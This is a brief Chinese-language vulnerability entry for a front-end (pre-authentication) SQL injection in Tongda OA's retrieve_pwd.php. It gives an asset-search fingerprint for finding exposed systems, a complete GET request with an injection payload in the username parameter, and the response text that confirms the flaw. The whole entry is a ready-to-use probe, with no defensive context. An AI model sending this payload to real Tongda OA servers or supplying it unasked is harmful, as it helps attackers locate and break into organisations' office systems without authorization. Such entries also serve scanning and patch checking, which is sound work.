# 通达OAretrieve_pwd前台SQL注入漏洞

通达OA ｜ SQL注入 ｜ —
- **指纹**：`app.name="通达 OA"`
- **请求**：`GET /ispirit/retrieve_pwd.php?_GET[username]=admin%27+and+%271%27%3D%272+ HTTP/1.1`
- **响应特征**：200 用户不存在